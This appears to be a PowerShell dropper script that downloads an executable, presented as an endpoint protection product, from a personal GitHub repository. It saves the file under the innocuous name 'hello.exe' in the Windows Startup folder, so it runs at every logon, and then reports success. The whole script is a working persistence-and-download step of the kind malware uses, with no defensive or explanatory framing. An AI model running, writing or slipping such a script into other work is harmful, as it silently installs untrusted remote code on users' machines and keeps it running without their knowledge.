# Define the URL of the file to download and the destination path
$fileUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/RAVEndpointProtection.exe"
$destinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hello.exe"

# Download the file
Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath

# Verify the download
if (Test-Path $destinationPath) {
    Write-Output "File downloaded successfully and saved to startup folder as hello.exe"
} else {
    Write-Output "Failed to download the file."
}
